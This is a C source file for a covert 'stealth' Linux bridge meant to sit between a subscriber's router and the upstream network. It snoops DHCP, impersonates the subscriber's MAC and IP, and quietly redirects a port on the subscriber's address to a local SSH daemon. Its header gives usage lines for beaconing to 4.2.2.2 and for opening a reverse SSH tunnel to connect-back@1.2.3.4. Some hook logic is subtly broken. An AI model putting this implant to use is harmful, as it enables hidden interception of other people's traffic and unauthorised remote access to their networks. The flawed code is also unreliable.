/**
 * Stealth Linux bridge with intercepting capabilities and automatic
 * configuration in DHCPv4 environments.
 *
 *
 * Consider the scenario where a Linux computer with two ethernet ports is
 * inserted between a downstream switch (preferrably providing internet access)
 * and an upstream subscriber's CPE (broadband router, computer, ..). 
 *
 * This program setups an ethernet bridge which relays traffic between the two
 * ports.  Meanwhile, it also provides these neat features:
 *
 * - Automatic configuration of the stealth bridge by snooping on DHCP packets
 * - Incoming TCP traffic for the subscriber's IP:$INTERCEPTPORT is redirected
 *   to the Linux computer's local SSH daemon, without alerting the subscriber
 * - Locally generated traffic on the Linux computer is routed down to the 
 *   internet switch, masquerading as the subscriber's CPE.  That is, the
 *   Linux computer has full internet access, shared with the subscriber.
 * - Optional notification commands can be executed when the stealth bridge
 *   is reconfigured (e.g., for reporting the subscriber's IP address or
 *   establishing a VPN tunnel.)
 *
 *
 * In order to avoid parsing ARP this code assumes the DHCPv4 replies are sent
 * from the local router's MAC address.  Therefore the code in its current
 * state won't work in environments where the DHCP server is next to the router.
 *
 * For 802.1X environments, see:
 * - Linux commit 515853ccecc6987dfb8ed809dd8bf8900286f29e (nov, 2011)
 * - Duckwall/DEFCON-19-Duckwall-Bridge-Too-Far.pdf (aug, 2011)
 * - http://www.spinics.net/lists/linux-ethernet-bridging/msg02027.html (2007)
 *
 *
 * Running:
 *   sudo apt-get install -y bridge-utils arptables ebtables iptables libpcap-dev
 *   gcc -o intercept -Wall intercept.c -lpcap
 *   sudo ./intercept eth0 eno1
 * ...or, assuming you can read the traffic at, or on the way to, 4.2.2.2:
 *   sudo POSTUP='ping -nqw1 -c1 -p0004820009 4.2.2.2' ./intercept eth0 eno1
 * ...or a slightly more involved example:
 *   sudo POSTUP='ssh -o ExitOnForwardFailure=yes -o ConnectTimeout=1  \
 *     -R 1234:127.0.0.1:22 -fnNi ~/.ssh/somekey connect-back@1.2.3.4' \
 *     ./intercept eth0 eno1
 * See also the SSH-BASED VIRTUAL PRIVATE NETWORKS section in ssh_config(5)
 *
 * For more stealthness you may want to disable IPv6 on interfaces, including
 * autoconfiguration on boot, with `ipv6.disable_ipv6=1` on the kernel
 * command line:  https://www.kernel.org/doc/Documentation/networking/ipv6.txt
 *
 *
 * On a Raspberry Pi with Raspbian you'll likely want to:
 *   sudo systemctl disable avahi-daemon dhcpcd
 *   sudo systemctl stop avahi-daemon dhcpcd
 *   sudo sed -i '$iip link set dev eth0 up || true' /etc/rc.local
 *   sudo sed -i '$iip link set dev eth1 up || true' /etc/rc.local
 *
 *  -- noah@hack.se (2012, 2016)
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pcap.h>

typedef struct {
	uint8_t code;
	uint8_t len;
	union {
		uint8_t data[0];
		struct in_addr addr[0];
	} __attribute__((packed));
} dhcp4_opt_t;

typedef struct {
	uint8_t op, htype, hlen, hops;
	uint32_t xid;
	uint16_t secs, flags;
	struct in_addr ciaddr, yiaddr, siaddr, giaddr;
	uint8_t chaddr[16];
	uint8_t legacy[192];
	uint32_t magic;
	uint8_t data[0];
} dhcp4_hdr_t;


static int usage(const char *self) {
	printf("Usage: %s <left ethernet interface> <right ethernet interface>\n"
		"  The left interface is connected to a downstream switch whereas\n"
		"  the right interface is connected to an upstream subscriber/client.\n"
		"Environment:\n"
		"  If the POSTUP environment variable is set, the script is executed\n"
		"  after the intercepting bridge has been brought up (on DHCP ACK).\n"
		"  Similarly, if the PREDOWN variable is set, the script is executed\n"
		"  before the interception stops\n", self);
	return 0;
}

static void setup_bridge(void) {
	uint8_t i;
	char *cmdlist[] = {
		/**
		 * Since Linux 3.18 (dec, 2014) this module is required to have the
		 * bridging code pass traffic up to iptables.
		 * /proc/sys/net/bridge/bridge-nf-call-iptables is '1' by default.
		 */
		"modprobe br_netfilter",
		/* Avoid leaks */
		"arptables -I OUTPUT -j DROP",
		"ip6tables -I OUTPUT -j DROP",
		/* Bring up bridge */	
		"brctl addbr $BRIF",
		"brctl addif $BRIF $LEFTIF",
		"brctl addif $BRIF $RIGHTIF",
		"ip link set dev $BRIF address $BRMAC",
		"ip link set dev $LEFTIF up",
		"ip link set dev $RIGHTIF up",
		"ip link set dev $BRIF up",
	};

	for(i = 0; i < sizeof(cmdlist)/sizeof(*cmdlist); i++) {
		printf(">> %s\n", cmdlist[i]);
		system(cmdlist[i]);
	}
}

static void teardown_bridge(void) {
	uint8_t i;
	char *cmdlist[] = {
		"[ -d /sys/class/net/$BRIF ]&&ip l s dev $BRIF down&&brctl delbr $BRIF",
		"resolvconf -d $BRIF 2>/dev/null", /* For systems with resolvconf */
		"sysctl -qw net.ipv4.ip_forward=0",
		"iptables -t nat -F PREROUTING && iptables -t nat -F POSTROUTING",
		"ebtables -t nat -F POSTROUTING",
		"arptables -F OUTPUT",
		"rmmod br_netfilter",
	};

	for(i = 0; i < sizeof(cmdlist)/sizeof(*cmdlist); i++) {
		printf(">> %s\n", cmdlist[i]);
		system(cmdlist[i]);
	}
}

static void enable_interception(void) {
	uint8_t i;
	char *hook;
	char *cmdlist[] = {
		/* Locally generated traffic should impersonate the subscriber ($RIGHTMAC, $RIGHTIP) */
		"ebtables -t nat -F POSTROUTING",
		"ebtables -t nat -A POSTROUTING -o $LEFTIF -s $BRMAC -j snat --to-src $RIGHTMAC",
		"iptables -t nat -F POSTROUTING",
		"iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p tcp -j SNAT --to $RIGHTIP",
		"iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p udp -j SNAT --to $RIGHTIP",
		"iptables -t nat -A POSTROUTING -o $BRIF -s $BRIP -p icmp -j SNAT --to $RIGHTIP",
		/* Remap incoming SSH traffic to $RIGHTIP:$INTERCEPTPORT on $BRIF to localhost */
		"iptables -t nat -F PREROUTING",
		"iptables -t nat -A PREROUTING -i $BRIF -p tcp -d $RIGHTIP --dport $INTERCEPTPORT -j REDIRECT --to-ports 22",
		"sysctl -qw net.ipv4.ip_forward=1",
		/* Bring up the bridge interface and set a static ARP entry for the router */
		"ip addr show dev $BRIF|grep -q 'inet ' >/dev/null || (\n"
		"	ip addr add ${BRIP}/24 dev $BRIF \n"
		"	ip route add default via $BRGW dev $BRIF)",
		"ip neigh replace $BRGW lladdr $LEFTMAC dev $BRIF nud permanent",
		/* For systems with resolvconf */
		"echo $DNS|fmt -1|sed 's:^:nameserver :'|resolvconf -a $BRIF 2>/dev/null",
	};

	for(i = 0; i < sizeof(cmdlist)/sizeof(*cmdlist); i++) {
		printf(">> %s\n", cmdlist[i]);
		system(cmdlist[i]);
	}

	/* Configurable bridge-is-up notification */
	if((hook = getenv("POSTUP")) == NULL)
		system(hook);
}

static void disable_interception(void) {
	uint8_t i;
	char *hook;
	char *cmdlist[] = {
		"iptables -t nat -F PREROUTING",
		"iptables -t nat -F POSTROUTING",
		"ip route del default via $BRGW dev $BRIF",
		"ip neigh flush dev dev $BRIF nud permanent",
	};

	/* Configurable bridge-is-up notification */
	if((hook = getenv("PREDOWN")) == NULL)
		system(hook);

	for(i = 0; i < sizeof(cmdlist)/sizeof(*cmdlist); i++) {
		printf(">> %s\n", cmdlist[i]);
		system(cmdlist[i]);
	}
}

static const dhcp4_opt_t *find_dhcp4_opt(const dhcp4_hdr_t *dhcp4, int32_t pktlen, int32_t code) {
	int32_t offset = 0;
	const dhcp4_opt_t *ret = NULL;

	while(offset < pktlen) {
		const dhcp4_opt_t *opt = (dhcp4_opt_t *)&dhcp4->data[offset++];
		if(opt->code == 0 /* padding */) {
			continue;
		}

		if(++offset >= pktlen) break;
		if(code == 0) printf("   option: % 4d (0x%02x), length % 4d, 1st byte: 0x%02x\n",
			opt->code, opt->code, opt->len, opt->data[0]);

		offset += opt->len;
		if(offset >= pktlen) break;

		if(opt->code == code)
			ret = opt;
	}

	return ret;
}

static void set_env_from_dhcp4_ack(const void *priv, const struct pcap_pkthdr *h, const u_char *pkt) {
	const struct ether_header *eh = (struct ether_header *)pkt;
	const struct ip *ip = (struct ip *)(pkt + sizeof(*eh));
	const struct udphdr *udp = (struct udphdr *)(pkt + sizeof(*eh) + (ip->ip_hl << 2));
	const dhcp4_hdr_t *dhcp4 = (dhcp4_hdr_t *)(pkt + sizeof(*eh) + (ip->ip_hl << 2) + sizeof(*udp));
	uint32_t pktlen = h->caplen - sizeof(*eh) + (ip->ip_hl << 2) - sizeof(*udp) - sizeof(*dhcp4);
	char left_mac[18], left_ip[16];
	char right_mac[18], right_ip[16];
	char dns_ips[16 * 4] = { 0 };
	const dhcp4_opt_t *opt;
	char **argv = (char **)priv;
	uint8_t i;

	/* Assume the local router is the source of the packets */
	snprintf(left_mac, sizeof(left_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
		eh->ether_shost[0], eh->ether_shost[1], eh->ether_shost[2],
		eh->ether_shost[3], eh->ether_shost[4], eh->ether_shost[5]);
	/* Router option */
	if((opt = find_dhcp4_opt(dhcp4, pktlen, 0x03)) == NULL) return;
	snprintf(left_ip, sizeof(left_ip), "%s", inet_ntoa(opt->addr[0]));

	/* DNS option */
	if((opt = find_dhcp4_opt(dhcp4, pktlen, 0x06)) == NULL) return;
	for(i = 0; i < opt->len / 4; i++) {
		snprintf(dns_ips + strlen(dns_ips), sizeof(dns_ips) - strlen(dns_ips), "%s ",
			inet_ntoa(opt->addr[i]));
	}

	snprintf(right_mac, sizeof(right_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
		eh->ether_dhost[0], eh->ether_dhost[1], eh->ether_dhost[2],
		eh->ether_dhost[3], eh->ether_dhost[4], eh->ether_dhost[5]);
	snprintf(right_ip, sizeof(right_ip), "%s", inet_ntoa(dhcp4->yiaddr));

	setenv("LEFTMAC", left_mac, 1);
	setenv("LEFTIP", left_ip, 1);
	setenv("RIGHTMAC", right_mac, 1);
	setenv("RIGHTIP", right_ip, 1);
	setenv("DNS", dns_ips, 1);

	/* Dump environment variables */
	printf("   LEFTIF=%-16s   LEFTMAC=%s  LEFTIP=%s\n", argv[1], left_mac, left_ip);
	printf("  RIGHTIF=%-16s  RIGHTMAC=%s RIGHTIP=%s\n", argv[2], right_mac, right_ip);
	printf("      DNS=%s\n", dns_ips);
	printf("\n");

	fprintf(stderr, "* Enabling intercepting bridge between"
		" (%s) %s <-> %s (%s)\n", left_mac, left_ip, right_ip, right_mac);
	enable_interception();
}

static void parse_dhcp4(const void *priv, const struct pcap_pkthdr *h, const u_char *pkt) {
	const struct ether_header *eh = (struct ether_header *)pkt;
	const struct ip *ip = (struct ip *)(pkt + sizeof(*eh));
	const struct udphdr *udp = (struct udphdr *)(pkt + sizeof(*eh) + (ip->ip_hl << 2));
	const dhcp4_hdr_t *dhcp4 = (dhcp4_hdr_t *)(pkt + sizeof(*eh) + (ip->ip_hl << 2) + sizeof(*udp));
	const dhcp4_opt_t *opt;
	char *dhcp4_type[] = { "DISCOVER", "OFFER", "REQUEST", "DECLINE", "ACK", "NAK", "RELEASE", "INFORM" };
	int32_t pktlen = h->caplen - sizeof(*eh) + (ip->ip_hl << 2) - sizeof(*udp) - sizeof(*dhcp4);
	uint8_t i;

	if(pktlen < 3 /* dhcp4 option */ || ntohl(dhcp4->magic) != 0x63825363) return;

	switch(dhcp4->op) {
	case 0x01:
		fprintf(stderr, "* DHCP client->server ");
		break;
	case 0x02:
		fprintf(stderr, "* DHCP server->client ");
		break;
	default:
		return;
		break;
	}

	if((opt = find_dhcp4_opt(dhcp4, pktlen, 0x35)) == NULL) {
		fprintf(stderr, "(missing DHCP message type option)\n");
		return;
	}

	fprintf(stderr, "(%s)\n", dhcp4_type[(opt->data[0] - 1) & 0x7]);
	printf("  eth src: "); for(i = 0; i < 6; i++) printf("%02x%s", eh->ether_shost[i], i<5?":":"");
	printf("   ip src: %*s", 16, inet_ntoa(*(struct in_addr *)&ip->ip_src));
	printf("  udp src: %d\n", ntohs(udp->uh_sport));
	printf("  eth dst: "); for(i = 0; i < 6; i++) printf("%02x%s", eh->ether_dhost[i], i<5?":":"");
	printf("   ip dst: %*s", 16, inet_ntoa(*(struct in_addr *)&ip->ip_dst));
	printf("  udp dst: %d\n", ntohs(udp->uh_dport));
	printf("   chaddr: "); for(i = 0; i < 6; i++) printf("%02x%s", dhcp4->chaddr[i], i<5?":":"\n");
	printf("   ciaddr: %*s", 16, inet_ntoa(dhcp4->ciaddr));
	printf("   yiaddr: %*s\n", 16, inet_ntoa(dhcp4->yiaddr));
	printf("   siaddr: %*s", 16, inet_ntoa(dhcp4->siaddr));
	printf("   giaddr: %*s\n", 16, inet_ntoa(dhcp4->giaddr));
	//find_dhcp4_opt(dhcp4, pktlen, 0 /* dump DHCP options */);
	printf("\n");

	switch(opt->data[0]) {
	case 0x05: /* DHCP ACK */
		set_env_from_dhcp4_ack(priv, h, pkt);
		break;
	case 0x06: /* DHCP NAK */
	case 0x07: /* DHCP RELEASE */
		fprintf(stderr, "* Disabling intercepting bridge\n");
		disable_interception();
		break;
	default:
		break;
	}
}

static int filter_dhcp4(pcap_t *handle) {
	struct bpf_program filter;
	char *expression = "udp and port 67 and port 68";

	if(pcap_compile(handle, &filter, expression, 0, PCAP_NETMASK_UNKNOWN) < 0) {
		fprintf(stderr, "pcap_compile: cannot compile expression: %s: %s\n",
			expression, pcap_geterr(handle));
		return -1;
	}

	if(pcap_setfilter(handle, &filter) < 0) {
		fprintf(stderr, "pcap_setfilter: failed to install filter: %s: %s\n",
			expression, pcap_geterr(handle));
		return -1;
	}

	return 0;
}

static volatile int signaled;
static void sighandler(int signo) {
	fprintf(stderr, "* Received signal %d, doing graceful exit...\n", signo);
	signaled++;
}


int main(int argc, char **argv) {
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	int ret;
	struct sigaction sa;
	pcap_t *handle;

	if(argc != 3)
		return usage(argv[0]);

	dev = argv[1];
	if((handle = pcap_open_offline(dev, errbuf)) == NULL) {
		dev = argv[2];
		handle = pcap_open_live(dev, 512, 0, 1000, errbuf);
	}

	if(handle == NULL) {
		fprintf(stderr, "pcap: failed to open device %s: %s\n", dev, errbuf);
		return -1;
	}

	if(pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "pcap: unspported link-layer header on device %s (must be ethernet)\n", dev);
		pcap_close(handle);
		return -1;
	}

	if(filter_dhcp4(handle) < 0) {
		pcap_close(handle);
		return -1;
	}

	setenv("LEFTIF", argv[1], 1);
	setenv("RIGHTIF", argv[2], 1);

	/* Set default environment; may be overriden */
	setenv("INTERCEPTPORT", "62222", 0);
	setenv("BRIF", "br0", 0);
	setenv("BRMAC", "00:bb:bb:bb:bb:bb", 0);
	setenv("BRIP", "33.0.0.1", 0);
	setenv("BRGW", "33.0.0.254", 0);

	setup_bridge();

	/* Attempt to restore environment if interrupted */
	sa.sa_handler = sighandler,
	sa.sa_sigaction = NULL;
	sa.sa_flags = SA_RESETHAND;
	sigfillset(&sa.sa_mask);
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	while(1) {
		struct pcap_pkthdr *h;
		const u_char *pkt;
		struct ether_header *eh;

		ret = pcap_next_ex(handle, &h, &pkt);
		if(ret < 0 || signaled) {
			if(ret == -2) ret = 0;
			if(ret == -1) pcap_perror(handle, "pcap_dispatch()");
			break;
		}

		if(!ret || h->caplen < sizeof(*eh)) continue;
		eh = (struct ether_header *)pkt;
		if(ntohs(eh->ether_type) == ETHERTYPE_IP)
			parse_dhcp4((void *)argv, h, pkt);
	}

	pcap_close(handle);
	teardown_bridge();

	return ret;
}
